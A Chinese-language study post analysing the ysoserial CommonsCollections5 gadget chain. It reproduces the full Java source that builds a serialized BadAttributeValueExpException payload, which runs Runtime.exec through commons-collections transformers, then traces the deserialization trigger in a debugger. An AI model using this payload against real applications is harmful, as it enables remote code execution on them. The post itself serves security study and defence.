ysoserial代码分析-CommonsCollections5
2022-03-02 11:42:51

1.前言

本篇文章为学习ysoserial代码系列的第五篇，分析的攻击链为CommonsCollections5，源码是以github上最新版ysoserial代码为例下载地址，具体运行环境为jdk 1.8+ 和 maven 3.x.+为主。

以下是CommonsCollections5的源码，依赖的库为commons-collections:commons-collections:3.1：

@PayloadTest ( precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

	public BadAttributeValueExpException getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] {
					String.class, Class[].class }, new Object[] {
					"getRuntime", new Class[0] }),
				new InvokerTransformer("invoke", new Class[] {
					Object.class, Object[].class }, new Object[] {
					null, new Object[0] }),
				new InvokerTransformer("exec",
					new Class[] { String.class }, execArgs),
				new ConstantTransformer(1) };

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections5.class, args);
	}

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}


2.基础知识

TiedMapEntry类：继承了Map.Entry、KeyValue,和Serializable上接口。

调用构造方法生成对象时，可以传入LazyMap类型参数对map变量进行赋值。

在getValue方法中会调用map变量的get方法。

在toString方法中会调用getValue方法。

BadAttributeValueExpException类：jdk提供的异常实现类，扩展了Exception基类。

在攻击链中需要用到的是BadAttributeValueExpException类的readObject方法，分析其代码在执行开始会在数据流中取val变量的值为valObj进行赋值，接下来判断valObj是否为空或者类型为String类型，再判断java安全管理器是否正确设置或者为基本数据类型，如果都不是最后会为valObj生成hashCode和类名称的组合字符串返回，当执行到valObj.toString()代码时，valObj此时的类型为TiedMapEntry对象，执行其toString方法触发攻击链。

在System类中，如果未设置安全管理器，一般默认为空。

3.代码分析

getObject方法执行的开始部分，和CommonsCollections1一样生成Transformer数组，设置恶意代码。

使用之前设置好的Transformer数组生成LazyMap对象，然后使用LazyMap对象作为TiedMapEntry构造方法的参数生成对象。

生成一个BadAttributeValueExpException对象，使用反射的方式为BadAttributeValueExpException对象的val参数赋值，val变量的此时实际类型为TiedMapEntry对象，返回payload。

4.调试运行

使用CommonsCollections5提供的测试代码，在Runtime的exec方法处下断点。

在BadAttributeValueExpException类的readObject方法中进入TiedMapEntry类的toString方法。

在toString方法中进入getValue方法。

在getValue方法中进入LazyMap类的get方法。

在get方法中执行了Transformer数组。

成功执行命令。
